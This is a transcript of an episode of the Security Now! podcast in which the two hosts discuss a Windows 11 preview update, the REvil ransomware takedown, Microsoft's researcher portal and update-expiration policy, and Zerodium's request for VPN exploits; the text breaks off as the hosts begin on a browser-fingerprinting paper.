It's time for Security Now!, the show where we protect you, your loved ones online, protect your privacy, discuss how the Internet works, and maybe recommend a sci-fi book or two.  That's the guy right here does it all, Mr. Steve Gibson of GRC.com.  Hi, Steve.



STEVE GIBSON:  Leo, great to be with you again.



LEO:  Don't put your thumb to your - do the live long and prosper.  That's much better, yeah.



STEVE:  Yeah, Lorrie gets upset when I talk about our final resting place.  She's oh, no, don't, no, don't talk about that.  Or anything.  She's...



LEO:  I'm with you, though.  As you get a little bit older,  you start thinking about these things, don't you.  I mean, you've got many years left, I'm sure.  You're very healthy.



STEVE:  I'm reconnecting with an old friend of mine after many, many years.  And we were trying to figure out where to get together for dinner, and I suggested a Chinese place, figuring - because he's also a coder, and I figured, oh...



LEO:  Coders love Chinese; right?



STEVE:  Exactly.  And what he wrote was love Chinese, can't eat beef any longer, but pork, chicken, and whatever it was, you know, is fine.



LEO:  This is sad, yeah.



STEVE:  And I thought, wow, it's going to be fun to catch up and compare our various...



LEO:  Aches and pains.  It's so funny, you know, because when you're young you kind of go, oh, those old people.  But then suddenly you're one.



STEVE:  Yeah.



LEO:  And you understand a little bit.



STEVE:  Yeah.  And one of the things I really appreciate is the degree to which, you know, the human body just keeps on limping forward.



LEO:  Yeah, yeah.



STEVE:  It's, you know, stuff begins to fall off, it's like, oh, well, what was that?



LEO:  Looks like I left some gears back there.



STEVE:  Hope that wasn't an important piece, yeah.  Well, and this is apropos, actually, of our topic.  The title of the show today is "The More Things Change...," of course the first half of the famous phrase, "the more they say the same."  This happened when one of my Twitter followers stumbled on a video which, given that it's exactly the same size that I originally created, and I've had links to them on the GRC site forever, it's made its way to YouTube.  I didn't put it there.



LEO:  Oh, yeah.  Viewers do, yeah.



STEVE:  But someone calling themselves TechTV put it there.  It's only about five and a half minutes long.  The first three are shocking.  It's you and I on Monday, April 9th, 2001, talking about security in the wake of something that has happened.  And what is - I played this for Lorrie yesterday, you know, I mean, she's peripherally aware of what's going on because she's been with me for about four years, and so she's heard a lot of this.  She was like, oh, my god.  Oh, my god.  I mean, and again, this is from 20.5 years ago.  We'll play it at the end of the show and talk about it because, again, the more things change, it's just amazing how little has changed.  But that's at the end.



We're first going to share some welcome news about Windows 11.  Leo, it turns out you get your wish about what happened with REvil.



LEO:  Oh.



STEVE:  Microsoft improves vulnerability report management.  They also attempt to explain their policy regarding the expiration of security updates.  Okay.  And they prepare for the imminent release of the next big feature - I've got "big" and "feature" in air quotes - update to Windows 10.  I know Paul and Mary Jo are kind of scratching their heads, too.  This is 21H2.  Zerodium has publicly solicited vulnerabilities in the top VPN providers, three of the top VPN providers, one of whom is a sponsor.  Three researchers disclose their new and devastating, Leo, devastating Gummy Browser attack, which I will then proceed to debunk.  We have another massively popular JavaScript NPM package which has been maliciously compromised in a supply chain attack, and unfortunately then widely downloaded.



We're going to close the loop by looking at a company called Nubeva, or Nubeva, I guess, and their claims of having solved the ransomware problem.  Then we're going to touch on a new annoyance that has been annoying me - I just thought it would be fun to see if it hits you, too - which is spreading across websites, and also briefly touch on four sci-fi events:  "Dune," "Foundation," "Arrival," and "Invasion."  After a brief update on SpinRite, then we're going to play something that was recorded more than 20 years ago.  And there isn't a listener who will not be thinking, oh, my god.  So I think another great podcast.



LEO:  Among other things, oh, my god, those two look so young.



STEVE:  Steve has hair.  You look pretty much the same, my friend.



LEO:  I don't know about that.



STEVE:  You're weathering pretty well.



LEO:  And I might be a little distracted throughout the show.  If I don't respond immediately to you, just go "Leo, Leo, put the MacBook down."  Because Lisa brought my new MacBook over.



STEVE:  Well, just mute your mic so we're not hearing strange erotic sounds of glee as you open the box.



LEO:  I promise.  I promise.  This is a good picture, I think, yeah.



STEVE:  Yeah.  It's a great picture.  I scanned through the video and found a representative moment in there where we were facing each other and talking.



LEO:  What does that say?  Patch War?  PatchWork?



STEVE:  PatchWork.  That was what invited me onto the show.  The FBI contacted me, along with SANS Institute, and asked if I could create quickly, and it took two days, to create something which SANS could offer to allow anyone to quickly check whether their IIS servers were running with all of the - there were four critical patches.  Anyway, and I only know any of that because I watched the video before our listeners have.  And we're going to play it at the end of the podcast because, as I said before, what was - well, I've said enough.  It was just startling to listen to what I was describing to you of what was going on then, and what all of our listeners know is going on today.  So we'll have fun at the end of the podcast.



Okay.  But first, something happened that I think is interesting for Windows 11 users.  The good news is that Microsoft has jumped right on those pesky Win11 problems which we enumerated at some length last week, and will reportedly and hopefully, I mean, you know, hopefully because we've heard some of this before.  Oh, we've got the printer fixed now.  It's like, oh, wait, next month we'll get the printer fixed.  And I heard you at some point, Leo, talking about people calling your weekend show with printing problems.  It's like, oh, yeah.



LEO:  I have a T-shirt that says "Don't ask me about printer problems.  I don't want to talk about it."  It's the worst.  I hate it.



STEVE:  Okay.  Oh, I know.  So anyway, hopefully they're going to have them fixed up two weeks from now, on November's Patch Tuesday.  However, anyone who's beset with the problems that next Patch Tuesday's updates are slated to fix, may jump the gun and preinstall the update without waiting.  It's packaged as KB5006746.  And googling that magic incantation, KB5006746, will take you right to it.  I also have a link to it in the show notes.  And looking at this link, when I was pasting in thought, you know, I guess Microsoft has just given up on the idea of a short URL.  I mean, okay, Microsoft.com/en-us, right, the language.



LEO:  Okay, okay.  You could leave that out, probably, yeah.



STEVE:  Right, the language.  Then /topic.  Okay.



LEO:  Okay, you need that.



STEVE:  Then now we need to have a date.  So we've got October 21, 2021.  Then we've got that magic KB5006746 number.  And it's for OS Build, so we've got that, OS Build 22282; right?  And it is after all a preview, so we've got to put preview on there.



LEO:  Oh, yeah.  Oh, yeah.



STEVE:  And then for lord only knows why, after all of that, which is entirely unambiguous, we've got a GUID, you know, a 03190705-0960-4BA4-9EE8-AF40BEF057D3.  It's like...



LEO:  They do love their GUIDs, don't they.



STEVE:  Certainly you're not going to type that in.  So it's funny, too, because I had an elderly friend for a long time who was never able to enter the Windows Activation Code correctly.  And I thought, you know, Microsoft has invented copy protection for old people.  Because he'd just, he'd say, "Steve, you gave me the wrong code."  I'd go, "No, Gary, I'm sure it's right."  "No, no, no.  I tried it 12 times.  It doesn't work."  And I'd go, "Okay, read it back to me."  And sure enough, you know, a J was a K or something.  It's like, "Okay, Gary, here you go."  He would just say, "Oh."



Anyway, okay.  I was going to enumerate the list of things that that URL, you know, the list is longer even than the URL is.  And that's saying something.  But oh my god, the list looks like the list of all the things they didn't get into Windows 11 earlier this month because someone on high said, "We shall ship on schedule."  And I'm not kidding.  The page's list is - and you click that link, you get a page.  It's split into Highlights and Improvements and Fixes.  There are 13 highlights for that link, and 64 improvements and fixes.  I mean, it now shines your shoes.  It's on there.



I scanned the list.  And after listening to the podcast for a few weeks, it felt like home.  It appeared that everything we've been grumbling about for the past month or two is present and accounted for there.  So this fix should go a long way toward dealing with all those many edge cases.  Okay.  And specifically, it appears that Microsoft believes that printing is finally fixed.  We'll wait and hear.  They've confirmed that this update fixes Windows 11 known issues causing printer installation fails and prompts for admin credentials before every attempt to print on systems commonly found in enterprise environments, as we discussed last week.  That's those HTTP connections, installing over the IPP protocol, and the inability to display custom print properties, all that, fixed.  And you can have it now, everybody.



But hold on.  The trouble with gaming on AMD chips, which reportedly got even worse after this month's patches, those are believed to be resolved.  And the problems with slowly responding Bluetooth mice and keyboards have also been resolved.  And that was really upsetting gamers.  Although no true gamer uses a radio connection to their mouse.  That's just - you don't do that.



Now, normally I would not recommend that our listeners jump the gun by installing a preview update.  In the entire history of this podcast, I have never suggested that would be a good idea.  But if you already jumped the gun by installing Windows 11, you're obviously afraid of nothing.  And once you've scanned through the list of the 77 things that have been highlighted and fixed, this might just be another gun worth jumping.  And besides, it feels like someone just pressed the "Ship It!" button a bit too soon on Windows 11, and this is just the stuff that didn't quite make it through the door before it slammed closed.  So it's sort of the Windows 11 that you were meant to get.  So I would say you could probably go ahead and do it two weeks early.  If not, wait for two weeks, and then it'll appear in your, oh, look, we have some improvements to Windows 11.  What do you know?  Yeah.



Okay.  Leo?  This is where you get your wish.



LEO:  Oh, yes?



STEVE:  REvil was recently retaken down by law enforcement.



LEO:  Hacked by law enforcement.



STEVE:  Yup.  Last Thursday, Reuters news service was the exclusive reporter that, according to three private sector cyber experts working with the United States, and one former official, the ransomware group REvil was itself hacked and re-forced offline in a multi-country operation.



Tom Kellermann, who is VMware's head of cybersecurity strategy and an adviser to the U.S. Secret Service on cybercrime investigations, he said that law enforcement and intelligence personnel stopped the group from victimizing additional companies.  He said:  "The FBI, in conjunction with Cyber Command, the Secret Service, and like-minded countries, have truly engaged in significant disruptive actions against these groups.  And REvil was the top of the list."



As we detailed last week, the new apparent leader of REvil, who was calling himself "0_neday," you know, numeric 0_neday, who had helped restart the group's operations after its first shutdown, which took everyone by surprise - well, maybe not everyone - said that REvil's servers had been hacked by an unnamed party.  Recorded Future reported that a Russian posting which they had translated into English, 0_neday wrote:  "The server was compromised, and they were looking for me.  Good luck, everyone.  I'm off."



So we now also learn a bit more about what was behind the FBI's deliberate, and questionable at the time, withholding of that universal decryption key which would have helped victims of the Kaseya attacks.  Remember that we found out that they had had it  for a while, and it was like, hey, why didn't they let it go?  Well, they needed to keep their cards close.  That accounts for the delay.  Following the attack on Kaseya, it turns out that, as we learned, the FBI did obtain a universal decryption key that allowed those infected through the Kaseya vulnerability to recover their files without paying a ransom.  They got it by hacking.



The FBI later acknowledged that law enforcement officials had initially withheld the key as they quietly pursued REvil's staff.  According to three people familiar with the matter, law enforcement and intelligence cyber specialists were able to hack REvil's computer network infrastructure, obtaining control of at least some of their servers.



Then UNKN, remember that guy U-N-K-N, UNKN disappeared; and later, this 0_neday guy and a few remaining team members returned and restored those websites from a backup last month.  But in doing so they unwittingly restored and restarted some internal systems that were already under the control of law enforcement.



LEO:  Oh, that's funny.  Oh, whoopsies.



STEVE:  Yup, they restored from an infected backup.



LEO:  Oh, my god.  How's it feel?  How did it feel?  Good?  How do you feel?



STEVE:  Yeah, how do you like them apples, yes.  Oleg Skulkin, who's the deputy head of the forensics lab at the Russian-led security company Group-IB, he said:  "The REvil ransomware gang restored the infrastructure from backups, assuming that they had not been compromised."



LEO:  Is going to be good.  Don't worry.  We got everything.  We saved it all.



STEVE:  That's right.  "Ironically, the gang's own favorite tactic of compromising backups was turned against them."



LEO:  Mm-hmm, mm-hmm, mm-hmm.



STEVE:  Officials have repeatedly declined to comment on the record.  A spokesperson for the White House National Security Council declined to comment on the operation specifically.  The FBI also declined to comment.  But one person familiar with the event said that an unnamed foreign partner of the U.S. government carried out the hacking operation that penetrated REvil's computer infrastructure.  And a former U.S. official, who spoke on condition of anonymity, said the operation was still active.



VMware's Tom Kellermann said:  "The success stems from a determination by U.S. Deputy Attorney General Lisa Monaco that ransomware attacks on critical infrastructure should be treated as a national security issue akin to terrorism."  And in June, Principal Associate Deputy Attorney General John Carlin told Reuters the Justice Department was elevating investigations of ransomware attacks to a similar priority.  Tom Kellermann explained that:  "These actions" - those I just named - "gave the Justice Department and other agencies a legal basis to get help from U.S. intelligence agencies and the Department of Defense."



"Before [this]," Tom explained, "you couldn't hack into these forums, and the military didn't want to have anything to do with it.  Since then, the gloves have come off."  So in other words, the U.S. military was finally engaged, and apparently getting into the hacker's inner sanctum wasn't so difficult.



LEO:  That's awesome.



STEVE:  So score one for the big, lumbering U.S. bureaucracy. As we have observed before, these crypto cretins need to keep their heads down and under the radar.  They made a big mistake when they poked the bear with a sharp stick.



LEO:  Yes, yes, yes.



STEVE:  And, you know, it is this oft-quoted slogan that we are a country ruled by laws.  Well, we could not legally do this until the nature of what was needed, that is, that we were combating, was officially assigned as a matter of national security at the level of terrorism.  And that then created the legal basis by which the other departments that had had to have their hands off officially, they could roll up their sleeves and say, ah, thank you very much.  That's what we wanted to hear.



LEO:  Got 'em.  Got 'em. 



STEVE:  Yup.



LEO:  Love it.  Love it.



STEVE:  Done.  So let's hope all of that underworld is listening because, you know, the sleeping giant can awaken.  And when it does, whoops, there's one fewer top-tier cyberterrorism gang loose.



Okay.  So Microsoft said, and this is good news:  "We're Excited to Announce the Launch of Comms Hub."  This is just yesterday.  Microsoft's MSRC blog, you know, their security research group, posted the news of a new Comms Hub, a vulnerability reporting and research portal.  Paraphrasing what their announcement was just for the content, they wrote:  "We are excited to announce the launch of Comms Hub to the Researcher Portal submission experience."  That's right.  So researchers now have a portal submission experience.



"With this launch," they said, "security researchers will be able to streamline communication with MSRC case SPMs."  And I looked everywhere.  I googled SPMs.  There's a lot of things it isn't.  But I don't know what it is.  They called it, they said in parens "(case managers)."  So M is probably for Managers.  I don't - security, okay, security...



LEO:  Something.



STEVE:  Something, a P, and it's bad.  So a bad thing...



LEO:  Security bad thing manager.  That's it, yes.



STEVE:  Right.  Anyway, SPMs.  So you can streamline your communication with these SPMs, whatever their Ps are, attach additional files, track cases and bug bounty status all in the Research Portal.



LEO:  Ooh.



STEVE:  They said:  "Currently" - yeah, woo.  Currently - maybe it's got dark theme, too.  I hope.  That's very popular.  "Currently, security researchers who submit via the portal communicate with MSRC via email."  Oh.  Who wants to do that?  Maybe your mail was lost.  Maybe that's why you don't think we responded to you.  Unh-huh.  Right.  "To create a better user experience for the security researcher" - because as we know it couldn't be much worse - "we're excited to introduce the Comms Hub feature to the Researcher Portal.  With Comms Hub, you will be" - you may not know what an SPM is, but you'll know what the Comms Hub is.  "You'll be able to streamline communication" - oh, here we are again - "with your case SPM."  They're really driving that fact home.



LEO:  It's apparently the opposite of PMS.  Whatever it is.



STEVE:  That's good. 



LEO:  Yeah.



STEVE:  You don't want that to happen.



LEO:  No.



STEVE:  To your security submission.



LEO:  Yes.



STEVE:  Anyway, view case status, add file attachments, and track the lifecycle - the lifecycle.  Hopefully it's not a long lifecycle.  We want this to die.  We want it to be resolved and be like, okay, put to bed.  Comms Hub provides chat functionality allowing asynchronous communications between researchers and the SPM.  Wait.  Asynchronous?  Chat's not asynchronous.  Chat's supposed to be synchronous.  Maybe you just...



LEO:  Well, you ask a question, an hour later they respond.  It's asynchronous, yeah.



STEVE:  Okay, that's good.  And the SPM, whoever they are, with all the relevant case data readily available, all within the Researcher Portal.  Okay.  I'm not even going to bother with the rest of this because everyone gets it; right?  It's got a Reports page where all of your reports could be viewed.  And you can click on one of those because it's got line items.  And then it takes you to the View Case Details page where you can look at a single one.  So hopefully, you know, certainly I think it's all good that Microsoft is working to improve upon and better manage their communication with security researchers who find and report problems with their software offerings.



What I'm hoping, I hope we can assume that the Comms Hub is the public-facing surface of a much deeper and significant mechanism within Microsoft for organizing and being responsive to reports of serious defects.  For Microsoft, the story of 2021 was, more than anything else, an indictment over their horrifyingly poor response to the known security shortfalls of their products which enabled successful attacks upon many of their own customers.  Perhaps there were some serious meetings last spring, after the mishandling of, for example, the Exchange Server flaws had become so apparent, with the result being that these new systems have now been put in place to prevent a repeat in the future.  Let's hope.



Microsoft also has attempted to explain their policy for expiring updates.  I encountered an interesting post by Microsoft, a somewhat shorter URL, but still two lines, regarding their policy surrounding the expiration of old updates.  And I should preface this by noting that I've never had any idea how Microsoft manages the incremental updating of this operating system as well as they do, or at all, for that matter.  As someone who builds projects from a large number of small files, I'm quite familiar with the idea of dependency trees and dependency resolution.  But Windows has become so mind-numbingly sprawling that I can't even imagine how they keep the dependency definitions straight, let alone deal with the binary results of all of that.  And as we know, it's an imperfect system; right?  I mean, right now I have a system or two where update no longer works.  It's like, okay.  It broke, as it does.



In any event, it has always seemed to me that there's no point in installing a Windows update if a subsequent update is going to be replacing what the earlier update updated.  On the other hand, if you don't wind up installing the subsequent update, or need to later back out of it, then that earlier obsoleted update starts looking pretty good.  And speaking of backing out of updates gone wrong, it's one thing to install these things sequentially.  That's at least conceivable.  And then to later back out of them in a strict reverse order, right, just by putting back what each one replaced backing out.



But if you really want your mind blown, think about reaching in and removing some arbitrary update from the middle of a much larger batch, which Windows has somehow always allowed.  Watching Windows Update run, I've often noted that the system's mass storage drive spends a lot of time not being in use.  In other words, Windows is quite busy thinking.  So perhaps individual Windows clients are spending a lot of their own time working out for themselves what to discard and what to roll back and what to keep.  That wouldn't surprise me.  But, boy, you know, I really do, tip of the hat to Microsoft for even attempting to do this on a consumer system, which is such a catastrophe.  I mean, it's not like it's a beautiful blob of code; right?  I mean, it's being updated constantly.  



LEO:  Well, its Mommy and Daddy think so.  You're such a beautiful blob of code.  You're so beautiful.  I'm sorry.



STEVE:  Okay.  So back to Microsoft's attempt to clarify this.  They wrote:  "Microsoft produces two to three updates per supported Windows platform monthly.  This results in a backlog of updates and potentially increases the size of update packages.  Many of these updates, however, are cumulative and include all earlier updates that have been published for that platform."  God help us.  Really?  "That means..."



LEO:  Well, that's the new thing, yeah, the cumulative rollup.



STEVE:  Yeah, right.  "When older packages expire," and this expiration is a new idea, "you still receive the updates contained in those packages by installing the cumulative update."  So they said:  "By expiring older redundant packages, you get better performance, shorter scan times, a faster user experience, and reduced risk of deploying older updates which have been superseded with newer, more secure ones."



LEO:  Also it's painful, you know this, when you install a new system.



STEVE:  Oh, Leo.



LEO:  And you have to reboot 18 times and install, install, install.



STEVE:  Well, you're about to go on a two-week vacation, so you want to start Windows Update.



LEO:  Now.



STEVE:  As the garage door is rolling up.



LEO:  And just tell Michael, every once in a while just go hit ENTER and let it go ahead.  Yeah.  Maybe by two weeks it'll be done.



STEVE:  That's right.  So they said:  "Here are answers to common questions we receive about our Windows Update expiration policy."  And of course it's no surprise that there are questions.  Now, these are questions they've asked themselves; right?  So they ask themselves:  "How often are update packages expired?"  Their answer to, now, remember a question they asked themselves:  "Our published packages are evaluated for expiration on a regular basis."



LEO:  We don't know.



STEVE:  No, we don't know how regular or irregular.



LEO:  It just depends.



STEVE:  But, you know, we're going to do that.  Then they said:  "Once a large enough quantity of candidates have been found" - we don't know how many.



LEO:  One, two, many, we don't know.



STEVE:  That's right.  What's that straw with the camel?  Anyway, "An expiration will take place."



LEO:  Oh.



STEVE:  So again, they ask the question, how often are update packages expired? 



LEO:  Well, you know, it depends.



STEVE:  Yeah.  So apparently as often as needed, or we feel like it, or the guy who does it came back from lunch.  We don't know.  Okay.  "Why aren't older updates expired?"  Again, they're asking themselves why aren't older updates expired?  To which they answer:  "Some older packages may not have yet been evaluated."  What?  "Or may not have met the criteria for expiration" if they have been evaluated, apparently.



LEO:  Somebody's still using them.



STEVE:  Whatever that means.  "So it is also possible that they have not yet expired because" - now, this is the one thing that makes sense - "of existing dependencies on that specific update."  So in other words, we expire older update packages when we want to and can.  Okay.



LEO:  As long as [crosstalk].



STEVE:  Right.  Finally:  "Are there any packages that cannot be expired?"  So here we finally get some meat.  "Security-only update packages for Windows 8.1, Windows Server 2012 SP2, Windows Server 2012, Windows 7 SP1, Windows Server 2008 R2, and Windows Server 2008 SP2 do not expire as they are not cumulative and hold only one month worth of fixes."  Thus, Leo, the experience anyone who tries to install one of those things and update them - and you know I do occasionally.  I've moved on, but, boy.  You are literally - there is no concept of a cumulative update.  You must go through a step at a time, one by one, and install every single one.



In other words, notice that all of that is up to Win10.  They're saying that until Windows 10, monthly security update packages were not cumulative.  They only contained the changes for the current month.  Thus all previous updates always needed to be installed first.  And you can't expire any of those if some crazy person - you know, guilty - wants to update one of those Windows offerings.  I mean, there are still valid reasons to run those; right?



LEO:  Sure, yeah.



STEVE:  Like for developers who have to make sure their stuff runs on those older packages.  So, yeah.  Anyway, it wasn't until Windows 10 that any single month's security update package could be used to bring any system current.  And that's the good news.  You could have - in fact, I've seen this happen where - because Lorrie has a stack of 20 laptops that she uses for remote neurofeedback, which clients do at their home.



LEO:  Oh, that Windows Update must be a fun day for you at that place.  Holy cow.



STEVE:  But that's the point.  They are, we are running Windows 10.  And so I can dust one of those off.  And even if it hasn't been turned on for six months...



LEO:  Right, one update.



STEVE:  ...it only installs the most recent month.  And it is made current.



LEO:  Yeah.  This is a huge, I think, a huge improvement in how they do this.



STEVE:  Yes.



LEO:  They needed to do this.



STEVE:  Yes.  And so, and then the last question:  How can I find out if my update was expired?  It's not hard.  If an update was expired, you will see the word "EXPIRED" appended to the title of the release note article associated with that specific update on support.microsoft.com.



LEO:  I was going to say sniff it and see if it smells bad.  I don't know.



STEVE:  Okay.  So anyway, that's basically, if something new has completely replaced something old, and it's for Windows 10, yes, then they're going to just say, okay, this is expired.  You should not be installing something old and stinky.  Just make yourself current.



Okay.  And while we're on the subject of Windows Updates - in Windows 10, not 11, but that applied to both - those who have chosen to remain with Windows 10 will probably be interested in knowing that the next big feature release, known as 21H2, will be rolling out in a few weeks.  It's now available to Windows Insiders in the Release Preview Channel.  Microsoft's John Cable, VP, Program Management, Windows Servicing and Delivery -and I guess he's the guy who slammed the door and kept those other Win11 things from making it into the release, but now you can add them.



He said:  "Windows 10 version 21H2 will have a scoped" - I don't know what this language means - "a scoped set of features focused on productivity and security, prioritized to meet our customers' needs based on feedback."  Or as Lorrie would say, "Blah blah blah blah blah."  Anyway, he said that 21H2 would include WPA3, that's cool, H2E standard support for enhanced Wi-Fi security.  So you get that, if there's anyone for it to talk to who also has WPA3.  "Windows Hello for Business," he said, "introduces a new deployment method called 'cloud trust' to support simplified passwordless deployments and achieve a deploy-to-run state within a few minutes."



Now, hold onto that thought because then he contradicts himself.  GPU compute support in the Windows Subsystem for Linux (WSL) and Azure IoT Edge for Linux on Windows deployments for machine learning and other compute intensive workflows.  So the Windows subsystem for Linux is getting some boosts.  But then Microsoft just said yesterday that they were still finalizing that Windows Hello for Business cloud trust deployment method, and that it would be subsequently launched in a monthly update.  So apparently not in 21H2.  That didn't make it, either.  Boy, they're slamming doors on things.



Anyway, once it's out, 21H2 will receive 18 months of support for Home and Pro editions, and 30 months for Enterprise and Education editions.  And just for what it's worth, I do recall Paul and even Mary Jo ho-humming this 21H2 update and being anything but excited, even to the point of Mary Jo asking Paul if there was any there there.  I'm sure everyone who wants to remain current with Windows 10 will want it. But there doesn't appear to be anything new and exciting.



LEO:  No, no.



STEVE:  For Linux, yes.  But for Windows?  Not so much.



LEO:  Linux has been updated, yeah.



STEVE:  Wow.  Oh, and the corners are still quite pointy.



LEO:  Oh, well, that's no good.  We've got to round those off.



STEVE:  Yeah, well, that's where you jump the shark and...



LEO:  You don't have your Start Menu on the left like an animal, do you?



STEVE:  It did get fixed, by the way.  Remember the Start Menu that didn't update for users who wanted it to, now they're updating, so that's good.



LEO:  Oh, thank you.



STEVE:  And Leo, we're going to discuss - I heard you on MacBreak Weekly talking about, and this was freaky, I didn't realize there were two anniversaries on the same day.  You were talking about on MacBreak Weekly the 20th anniversary of the iPod. 



LEO:  That's right, yeah.



STEVE:  Yesterday.



LEO:  Yeah, October 25th, yeah.



STEVE:  There was a different anniversary, 20th anniversary, we'll talk to after you tell us who's paying for this.



LEO:  Things were hopping 20 years ago.



STEVE:  That's right.



LEO:  Including us.  Usually when you mention an acronym, the chat room, we've got two of them, we've got the Discord in our Club Twit, we've got our IRC, comes up with a name.  No one has yet figured out what SPM is.  The closest anyone came, and this is from Microsoft's AllAcronyms.com, Shared Property Manager.  I don't think that's right.  I don't think that's correct.  Anyway, no one knows it.  Typical; right?  Great acronym.  No one knows what it means.  And everybody's probably too scared to even ask; you know?  Oh, yeah, it's SPM.



STEVE:  And, in Microsoft's own posting, they put parens afterwards and said whatever it was, account manager or something.



LEO:  They didn't even give you the right thing.  Oh, wow.



STEVE:  Right.



LEO:  They don't know either.



STEVE:  So the other birthday that occurred yesterday, Windows XP, 20 years.  The 20th anniversary of Windows XP.



LEO:  And people are still using it.



STEVE:  Do you know, one in 167 machines are running XP.  That's 0.6% of all Windows, I mean, that's not nothing.



LEO:  It's better than I thought, to be honest.  But still it's way too many.  It's probably millions; right?



STEVE:  Well, I'll bet they're in, you know, they're keeping ATMs and kiosks alive.  You'll see it crash on some stadium screen.  It's like, oh, look, they're still running XP.  And, you know, it occurs to me, as I think about XP now being 20 years old, that I've always been grumpy about Windows being changed.  I've always wanted Microsoft to just please leave it the you know what alone.  You know, fix it, yes.  But stop constantly changing it just for the sake of having something new to sell.



I recall on the occasion of XP's birthday complaining at the time that they had just taken the very utilitarian and extremely functional Windows 2000, there was nothing wrong with Windows 2000, it was rock solid, you know, it was the evolution from NT.  And they added, as I described it, a thick candy-colored sugar coating to Windows 2000's UI, I mean, just made it all pretty colored, and with the same operating system underneath.  And in fact that of course was a bone of contention because it also brought the raw sockets that Windows 2000 had... 



LEO:  Oh, that's right.



STEVE:  ...over to a consumer OS.



LEO:  Wow, right.  You were really inveighing against that, I remember.



STEVE:  It was a mistake.  And, you know, it took a while...



LEO:  They backed down, yeah.



STEVE:  ...for them to say whoops, that's what he was talking about.  But it took them getting attacked to see the light.  Anyway, speaking of attacked, last Tuesday the 19th, Zerodium tweeted, and I have a picture of their tweet in the show notes.  On October 19th:  "We're looking for #0day exploits affecting VPN software for Windows."  And they enumerate the three:  ExpressVPN, NordVPN, and Surfshark.  They said:  "Exploit types:  information disclosure, IP address leak, or remote code execution.  Local privilege escalation is out of scope."



LEO:  Huh.



STEVE:  Meaning they don't want that.  They don't want just any exploit.



LEO:  No, they want to get in.



STEVE:  They want to identify is what those...



LEO:  Oh, identify, yeah, yeah.



STEVE:  Yes.



LEO:  Or remote code execution, which is always nice.



STEVE:  Yes.  If you can run code, identification is then not a problem.



LEO:  We should mention ExpressVPN's a sponsor.  But we should also this doesn't - this actually could be encouraging.  It means they don't have them right now; right?



STEVE:  Correct.  And sadly, it also means there's a demand.



LEO:  Somebody's looking for them, yeah.



STEVE:  Yes.



LEO:  Guess who?  What do you think?  Yeah.



STEVE:  Uh-huh.  So as we know, Zerodium's in the business, unfortunately, of reselling software vulnerabilities.  Literally.  Let me say that again.  They resell software vulnerabilities.  It's like, what?  They appeared in 2015, headquartered in Washington, D.C.  That's convenient.  And we've been following their exploits, if you'll pardon the pun, ever since.  Their sleazy business model is to purchase exploits for freshly discovered and unknown zero-day vulnerabilities occurring in high profile and often targeted applications, as is the case here.  And then compile, catalog, and resell those exploits to government and law enforcement agencies.  And what do we imagine those government and law enforcement agencies do with said exploits? 



On this podcast, we spend a lot of time focusing on the good guy hackers, who participate in public Pwn2Own competitions or who responsibly report their valuable vulnerability findings to a bug bounty program, either an independent clearinghouse or directly to the affected company.  All of the major companies pay one way or the other now to learn of responsibly disclosed vulnerabilities in their own software.  It's become part of what a security responsible company does.



And then there's Zerodium, the fly in the ointment.  And they do pay big.  Security researchers are encouraged to sell their exploits for up to $2.5 million, depending upon the type and target of their discovery.  And from time to time Zerodium has launched limited time bug acquisition drives during which they  express their desire to purchase zero-day exploits in non-standard software.  Some previous acquisition drives have targeted specific routers, cloud services, mobile instant messaging clients, and even something as niche as the Pidgin app, which is popular with cybercrime organizations.  Major VPN providers such as the three now being targeted by Zerodium, manage networks of thousands of VPN servers located across the globe, rerouting their customers' web traffic or other communications traffic to mask their users' physical location, under the premise that where someone is, is no one else's business.



What's interesting is that these VPN services work with VPN clients residing on any OS platform, right, Windows, macOS, Linux, Unix, iOS or Android.  But Zerodium's solicitation last week plainly stated that they were only interested in exploits targeting Windows clients, and specifically exploits that can disclose a VPN user's personal information, that can reveal the user's real-world IP address, or exploits that allow remote code execution on the user's computer.  This suggests that there's a market among governments and law enforcement for the targeted penetration and determination of the identities of VPN users who are proactively protecting their privacy and identity using the services of these major VPN providers.



We know that not everyone who uses a VPN does so merely to geo-relocate themselves for the purpose of accessing locally embargoed media content, or to keep their nosy ISPs out of their business.  There actually was a story that I looked at it, but it didn't quite make the cut, about how much more data ISPs are collecting on their own customers than is normally understood.  Anyway, it's certainly the case that criminals also use VPN services to evade law enforcement.  So, yeah, as always it's a double-edged sword.  But something still feels very slimy about having an agent of the government and other three-letter agencies, which is exactly what Zerodium actually is, actively soliciting for vulnerabilities in products designed to protect their users.



LEO:  Do you think Zerodium is - they're not run by the U.S. government.  You're not saying that.



STEVE:  No.  No.  I don't think...



LEO:  I think that they work for a variety of - they work for whoever pays the most; right?



STEVE:  Yes.  So I'm sure they're selling their stuff, well, that's how they can afford to pay $2.5 million...



LEO:  Yeah.



STEVE:  ...for something juicy is that essentially they're a subscription service; right?  The various governments subscribe, and they're collecting taxes, and some of it goes to Zerodium.  Three-letter agencies subscribe.  So the idea is they're generating a cash flow from across the globe, or rich, well-monied organizations that have an application for unknown vulnerabilities in...



LEO:  Usually governments.



STEVE:  ...software across the board, yes.



LEO:  Yeah, nation-states or their agencies.



STEVE:  Well, you have to be to have that much money, to be able to subscribe and say, yeah, you know, tell us about anything you find.  We want it all.



LEO:  Well, we just saw that The New York Times tech reporter was hacked.  His iPhone was hacked...



STEVE:  Yup, over and over and over.



LEO:  ...by Pegasus, which is the NSO Group, which is an Israeli company.



STEVE:  Yup.



LEO:  And probably at the behest of Saudi Arabia or one of the countries he's reporting on.



STEVE:  Yup.



LEO:  And, yeah.  The good news is that these are so expensive, you're not going to see these in day-to-day exploits against you and me.



STEVE:  No.  Well, and that's the other thing, too, is they're only valuable until they're known.  So certainly part of the agreement that Zerodium has with their buyers, no, obviously their seller cannot ever tell about the thing that they're selling.  But their buyers have to exercise extreme care in using them.  So, yes, targeted attacks because the moment anyone finds a vulnerability, just like Apple, you know, they jump on these things immediately and work to shut them down, the moment that they figure out how the NSO Group has managed, got Pegasus running in their iPhone again.



LEO:  Right, right.



STEVE:  Okay.  So this is fun because this is not serious.  Despite the fact, well, I mean, it is serious, but it shouldn't  be.  The article, the paper describing this devastating attack even has your beautiful lines pointing, numbered lines pointing in every direction.  Visit the attacker.  Number two, acquire user's browser fingerprint.  Three, users' browser information.  Four, visit, I mean, going around and around.



Okay.  So in preparing each week's podcast, I survey the news of the past week, selecting those items that I think are important and that our listeners should be informed of and/or would enjoy.  And I typically skip over dumb things that don't merit our time.  But in this case...



LEO:  Good.



